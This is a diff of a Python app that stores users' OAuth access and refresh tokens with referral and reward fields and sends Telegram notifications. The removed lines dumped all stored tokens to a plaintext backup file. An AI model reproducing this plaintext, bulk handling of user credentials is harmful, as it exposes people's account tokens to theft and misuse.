@@ -30,13 +30,12 @@ BACKUP_FILE = 'tokens_backup.txt'
 # Initialize PostgreSQL database
 # Updated init_db function to include referral and task tables
 
-# Initialize PostgreSQL database
 def init_db():
-    """Sets up the required tables in the database if they don't exist."""
+    """Sets up the required tables and columns in the database if they don't exist."""
     conn = psycopg2.connect(DATABASE_URL, sslmode='require')
     cursor = conn.cursor()
 
-    # Users table with referral and balance fields
+    # Users table with necessary columns
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             id SERIAL PRIMARY KEY,
@@ -44,19 +43,21 @@ def init_db():
             access_token TEXT,
             refresh_token TEXT,
             referral_code TEXT UNIQUE,
+            referral_url TEXT,
             referred_by TEXT,
             referral_count INTEGER DEFAULT 0,
-            token_balance INTEGER DEFAULT 0
+            referral_reward REAL DEFAULT 0.0,
+            token_balance REAL DEFAULT 0.0
         )
     ''')
 
-    # Tasks table to define tasks available to users
+    # Tasks table for defining tasks available to users
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS tasks (
             id SERIAL PRIMARY KEY,
             title TEXT NOT NULL,
             description TEXT,
-            reward INTEGER DEFAULT 0,
+            reward REAL DEFAULT 0.0,
             status TEXT DEFAULT 'active'
         )
     ''')
@@ -71,8 +72,10 @@ def init_db():
         )
     ''')
 
+    # Commit changes and close connection
     conn.commit()
     conn.close()
+    print("Database initialized with updated schema.")
     
 def store_token(access_token, refresh_token, username):
     print("Storing token in the database...")
@@ -126,19 +129,8 @@ def store_token(access_token, refresh_token, username):
         conn.commit()
         conn.close()
 
-        # Notify via Telegram
+        # Notify via Telegram with the referral URL
         send_message_via_telegram(f"💾 User @{username} has been stored. Referral URL: {referral_url}")
-
-    except Exception as e:
-        print(f"Database error while storing token: {e}")
-
-        backup_data = get_all_tokens()
-        formatted_backup_data = [{'access_token': a, 'refresh_token': r, 'username': u} for a, r, u in backup_data]
-        with open(BACKUP_FILE, 'w') as f:
-            json.dump(formatted_backup_data, f, indent=4)
-        print(f"Backup created/updated in {BACKUP_FILE}. Total tokens: {len(backup_data)}")
-
-        send_message_via_telegram(f"💾 User @{username} stored. Referral URL: {referral_url}\n📊 Total tokens in backup: {len(backup_data)}")
 
     except Exception as e:
         print(f"Database error while storing token: {e}")
